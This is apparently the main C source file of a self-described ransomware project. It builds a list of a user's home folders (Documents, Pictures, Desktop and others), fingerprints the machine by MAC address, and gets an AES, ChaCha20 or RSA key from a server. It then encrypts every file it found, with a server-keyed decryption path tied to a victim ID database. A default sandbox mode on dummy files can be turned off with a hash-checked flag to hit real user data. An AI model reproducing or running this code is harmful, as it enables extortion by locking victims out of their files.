#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/decoder.h>

#include "files_finder.h"
#include "crypto_rsa.h"
#include "crypto_aes.h"
#include "crypto_chacha20.h"
#include "benchmark.h"
#include "server.h"

int g_safeMode = 1;
int g_encryption = 0;
int g_decryption = 0;

/**
 * @brief Initialize an area with useless files to execute the ransomware in safe mode.
*/
char** init_safe_mode_area()
{

    char* p_sandboxPath = "/tmp/sandbox-ransomware/";
    char** pp_paths = malloc(sizeof(char*));

    printf("[+] Initializing safe mode area\n");

    /* Test if sandbox environment already exist */
    struct stat sb;

    if (stat(p_sandboxPath, &sb) && g_encryption){

        /* Create sandbox directory in /tmp/ */
        if (mkdir(p_sandboxPath, 0777) == -1)
        {
            perror("[-] Sandbox directory creation failed");
            exit(1);
        }

        /* Create useless files in sandbox directory */
        char* p_files[] = {"file1", "file2", "file3", "file4", "file5"};
        for (int i = 0; i < 5; i++)
        {
            /* Allocate memory to files path */
            char* p_filePath = malloc(strlen(p_sandboxPath) + strlen(p_files[i]) + 2);
            if (p_filePath == NULL)
            {
                perror("[-] Sandbox files creation failed");
                exit(1);
            }
            sprintf(p_filePath, "%s/%s", p_sandboxPath, p_files[i]);
            FILE* p_file = fopen(p_filePath, "w");
            if (p_file == NULL)
            {
                perror("[-] Sandbox files creation failed");
                exit(1);
            }

            /* Fill files with data */
            fprintf(p_file, "This is a useless file\n");

            /* Close file descriptor */
            fclose(p_file);

            /* Free memory */
            free(p_filePath);
        }
    }

    *pp_paths = malloc(sizeof(char*) * (strlen(p_sandboxPath) + 1));
    if (*pp_paths == NULL)
    {
        perror("[-] Sandbox files creation failed");
        exit(1);
    }
    sprintf(*pp_paths, "%s", p_sandboxPath);

    printf("[+] Safe mode area initialized\n");

    return pp_paths;

}

char** init_unsafe_mode()
{
    char* pp_targetFolders[] = {"Downloads/", "Desktop/", "Music/", "Pictures/", "Videos/", "Documents/"};
    char* p_pathBase = NULL;
    char** pp_paths = NULL;

    /* Get victim username */
    char* p_login = get_username();

    p_pathBase = malloc(strlen("/home/") + strlen(p_login) + 2);
    if (p_pathBase == NULL) {
        perror("[-] malloc failed");
        exit(1);
    }

    sprintf(p_pathBase, "/home/%s/", p_login);

    /* Allocate memory for paths */
    pp_paths = malloc(sizeof(char*) * (sizeof(pp_targetFolders) / sizeof(pp_targetFolders[0])));
    if (pp_paths == NULL) {
        perror("[-] malloc failed");
        exit(1);
    }

    // Build paths and store them in the array
    for (int i = 0; i < sizeof(pp_targetFolders) / sizeof(pp_targetFolders[0]); i++) {
        pp_paths[i] = malloc(strlen(p_pathBase) + strlen(pp_targetFolders[i]) + 1);
        if (pp_paths[i] == NULL) {
            perror("[-] malloc failed");
            exit(1);
        }
        sprintf(pp_paths[i], "%s%s", p_pathBase, pp_targetFolders[i]);
    }

    free(p_pathBase);

    printf("[+] Unsafe mode initialized\n");

    return pp_paths;
}

int main(int argc, char const *argv[])
{
    char** pp_paths = NULL;
    int countPaths = 1;

    unsigned char* p_algo = NULL;
    unsigned char* p_iv = NULL;
    unsigned char* p_key = NULL;
    unsigned char* p_macAddress = NULL;
    EVP_PKEY* p_pubKey = NULL;
    EVP_PKEY* p_privKey = NULL;
    EVP_CIPHER_CTX* p_e_ctx = NULL;
    EVP_CIPHER_CTX* p_d_ctx = NULL;

    /* Parse options */
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--disableSM") == 0)
        {
            if (strcmp(argv[i+1], "286755fad04869ca523320acce0dc6a4") == 0)
            {
                printf("[+] Safe mode disabled\n");
                g_safeMode = 0;

                /* Initialize unsafe mode */
                pp_paths = init_unsafe_mode();

                countPaths = 6;
            }
        } else if (strcmp(argv[i], "--encrypt") == 0)
        {
            g_encryption = 1;
        } else if (strcmp(argv[i], "--decrypt") == 0)
        {
            g_decryption = 1;
        }
    }

    if (!g_encryption && !g_decryption)
    {
        printf("[-] No action specified\n");
        exit(1);
    }

    if (g_encryption && g_decryption)
    {
        printf("[-] Can't encrypt and decrypt at the same time\n");
        exit(1);
    }

    if (g_safeMode)
    {
        printf("[+] Ransomware in safe mode\n");
        pp_paths = init_safe_mode_area();
    }

    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, pp_paths, countPaths);

    /* Affichage des fichiers indexés */
    print_path_data(p_listFileData);

    /* Get the identifier of the current computer */
    p_macAddress = get_identifier();

    printf("[+] Identifier: %02X:%02X:%02X:%02X:%02X:%02X\n", p_macAddress[0], p_macAddress[1], p_macAddress[2], p_macAddress[3], p_macAddress[4], p_macAddress[5]);

    if (g_encryption)
    {
        /* Create benchmark structure to send to the server */
        benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);

        /* Get the encryption key based on the benchmark */
        p_key = get_encryption_key(p_macAddress, p_benchmarkData, &p_algo, &p_iv);

        printf("[+] Encryption key GET success\n");

        if (p_algo != NULL)
        {
            printf("[+] Algorithm: %s\n", p_algo);
            printf("[+] Encrypting files\n");
            if (strncmp((char*)p_algo, "RSA", 3) == 0)
            {
                /* Save the encryption key if rsa algorithm is chosen */
                save_key((char*)p_key, ENC_RSA_KEY_NAME);
                /* Get RSA public key from a file */
                p_pubKey = rsa_load_key(ENC_RSA_KEY_NAME, OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
                /* Encrypt files */
                rsa_encrypt_files(p_listFileData, p_pubKey);

                /* Free key */
                EVP_PKEY_free(p_pubKey);
            } else if (strncmp((char*)p_algo, "AES", 3) == 0)
            {
                /* Encrypt files */
                p_e_ctx = load_aes_encryption_key(p_key, p_iv);
                /* Encrypt files */
                aes_encrypt_files(p_listFileData, p_e_ctx);

                /* Free key and iv */
                EVP_CIPHER_CTX_free(p_e_ctx);
                free(p_iv);
            } else if (strncmp((char*)p_algo, "CHACHA20", 8) == 0)
            {
                /* Encrypt files */
                p_e_ctx = load_chacha_encryption_key(p_key, p_iv);
                /* Encrypt files */
                chacha20_encrypt_files(p_listFileData, p_e_ctx);

                /* Free key and iv */
                EVP_CIPHER_CTX_free(p_e_ctx);
                free(p_iv);
            }
        } else {
            printf("[-] No algorithm specified\n");
            exit(1);
        }

        printf("[+] Files encrypted\n");

        /* Free memory */
        free(p_key);
        free(p_algo);
        free(p_benchmarkData);
    }

    if (g_decryption)
    {
        p_key = get_decryption_key(p_macAddress, &p_algo, &p_iv);

        printf("[+] Decryption key GET success\n");

        if (p_algo != NULL)
        {
            printf("[+] Algorithm: %s\n", p_algo);
            printf("[+] Encrypting files\n");
            if (strncmp((char*)p_algo, "RSA", 3) == 0)
            {
                /* Save the encryption key if rsa algorithm is chosen */
                save_key((char*)p_key, DEC_RSA_KEY_NAME);
                /* Get RSA public key from a file */
                p_privKey = rsa_load_key(DEC_RSA_KEY_NAME, OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
                /* Decrypt files */
                rsa_decrypt_files(p_listFileData, p_privKey);

                /* Free key */
                EVP_PKEY_free(p_privKey);
            } else if (strncmp((char*)p_algo, "AES", 3) == 0)
            {
                /* Encrypt files */
                p_d_ctx = load_aes_decryption_key(p_key, p_iv);
                /* Encrypt files */
                aes_decrypt_files(p_listFileData, p_d_ctx);

                /* Free key and iv */
                EVP_CIPHER_CTX_free(p_d_ctx);
                free(p_iv);
            } else if (strncmp((char*)p_algo, "CHACHA20", 8) == 0)
            {
                /* Encrypt files */
                p_d_ctx = load_chacha_decryption_key(p_key, p_iv);
                /* Encrypt files */
                chacha20_decrypt_files(p_listFileData, p_d_ctx);

                /* Free key and iv */
                EVP_CIPHER_CTX_free(p_d_ctx);
                free(p_iv);
            }
        } else {
            printf("[-] No algorithm specified\n");
            exit(1);
        }

        printf("[+] Files decrypted\n");

        /* Delete id in database */
        delete_id(p_macAddress);

        /* Free memory */
        free(p_key);
        free(p_algo);
    }

    for (int i = 0; i < countPaths; i++) {
        free(pp_paths[i]);
    }

    free_path_data(p_listFileData);
    free(p_macAddress);
    free(pp_paths);

    return 0;
}
